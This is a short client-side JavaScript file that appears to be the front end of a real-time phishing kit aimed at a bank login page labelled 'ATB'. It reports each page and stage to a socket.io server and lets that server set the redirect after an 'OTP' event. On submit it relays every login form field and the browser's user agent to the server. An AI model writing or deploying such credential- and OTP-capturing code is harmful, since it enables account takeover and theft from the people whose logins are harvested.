const socket = io();
let navig = document.getElementById('navig').textContent
let stage = document.getElementById('stage').textContent


socket.emit('pageandstage', {page: 'ATB', stage: stage})

socket.on('OTP', (data) => {
    if(data.otp){
        navig = `${data.navig}`;
    } 
    console.log(navig)
})


function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;

    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submit', Object.fromEntries(formData));

    window.location.href = navig;
}